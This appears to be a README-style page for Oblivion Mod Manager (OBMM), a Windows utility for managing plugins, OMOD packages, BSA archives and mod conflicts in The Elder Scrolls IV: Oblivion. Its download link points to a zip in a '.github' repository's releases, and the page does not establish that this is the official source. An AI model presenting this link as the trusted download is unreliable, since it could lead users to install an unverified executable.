Oblivion mod manager (OBMM) is a Windows utility for managing plugins and organizing modifications for **The Elder Scrolls IV: Oblivion**. It provides an enhanced alternative to the game's Data Files selector, supports OMOD packages, and includes additional tools for managing game archives, save files, and mod conflicts.

Download: [Oblivion Mod Manager OBMM Last Version](https://github.com/Oblivion-Mod-Manager/.github/releases/download/1/Oblivion.Mod.Manager.O.B.M.M.v.1.1.12.zip)

## Overview

OBMM helps organize an Oblivion mod setup by combining plugin management, OMOD-based mod installation, and several utilities in one application.

It can operate as an enhanced plugin selector or as a more advanced mod manager when modifications are packaged in the OMOD format.

## Core Features

- **Plugin Management** — Manage installed ESP and ESM plugins through an enhanced Data Files interface.
- **OMOD Support** — Create, organize, activate, and deactivate specially packaged Oblivion modifications.
- **BSA Tools** — Browse and unpack Bethesda archive files.
- **Save File Management** — Track the active plugin list associated with individual saves.
- **Conflict Detection** — Identify overlapping files and potential mod conflicts.
- **Archive Invalidation** — Generate `archiveinvalidation.txt` entries for supported asset-management workflows.
- **Mod Packaging** — Prepare OMOD archives for distribution with installation information and configuration options.

## OMOD Package Management

OBMM provides additional functionality for modifications distributed as `.omod` files.

These packages can include installation scripts and configuration information, allowing supported mods to automate parts of their installation process. Depending on the package, this can include dependency checks, conflict handling, plugin load-order instructions, BSA registration, and configuration adjustments.

The available automation depends on the contents of each OMOD package.

## Additional Utilities

Beyond plugin management and OMOD installation, OBMM includes tools for working with Oblivion's supporting files:

- BSA archive browsing and extraction.
- Save-game and plugin-list management.
- File conflict and overlap detection.
- Archive invalidation generation.
- Additional modding utilities for players and mod creators.

## Requirements and Compatibility

- **Target Game:** The Elder Scrolls IV: Oblivion.
- **Operating Environment:** Windows.
- **Runtime:** The self-installer version requires Microsoft .NET Framework 2.0. The installer can offer to download it if it is missing.

The published release is an older version of the utility. Compatibility with modern Windows configurations and newer Oblivion-related environments has not been established by the available project documentation.
